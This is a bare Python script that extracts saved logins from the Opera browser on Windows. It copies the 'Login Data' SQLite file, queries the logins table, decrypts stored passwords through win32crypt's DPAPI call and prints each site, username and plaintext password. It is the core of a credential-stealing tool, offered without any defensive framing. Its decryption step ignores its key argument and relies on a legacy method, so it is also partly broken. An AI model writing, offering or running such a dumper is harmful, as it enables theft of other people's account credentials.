import os
import shutil
import sqlite3
import win32crypt
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def decrypt_password(password, key):
    try:
        return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
    except:
        return ""

def main():
    profiles = ["Default"]
    for profile_name in profiles:
        # Determine the local SQLite Opera database path for this profile
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
                               "Opera Software", "Opera Stable", "Login Data")

        # Check if the database file exists for this profile
        if not os.path.exists(db_path):
            print(f"Database not found for profile: {profile_name}")
            continue

        # Copy the file to another location
        # as the database will be locked if Opera is currently running
        filename = f"OperaData_{profile_name}.db"
        shutil.copyfile(db_path, filename)

        # Connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()

        # Query the 'logins' table to fetch saved passwords
        cursor.execute("SELECT origin_url, username_element, username_value, password_element, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

        # Iterate over all rows in the 'logins' table
        for row in cursor.fetchall():
            origin_url = row[0]
            username_element = row[1]
            username = row[2]
            password_element = row[3]
            password = decrypt_password(row[4], None)
            date_created = row[5]
            date_last_used = row[6]

            if username or password:
                print(f"Profile: {profile_name}")
                print(f"Origin URL: {origin_url}")
                print(f"Username: {username_element} = {username}")
                print(f"Password: {password_element} = {password}")
            else:
                continue

            if date_created:
                print(f"Creation date: {get_chrome_datetime(date_created)}")
            if date_last_used:
                print(f"Last Used: {get_chrome_datetime(date_last_used)}")
            print("=" * 50)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

if __name__ == "__main__":
    main()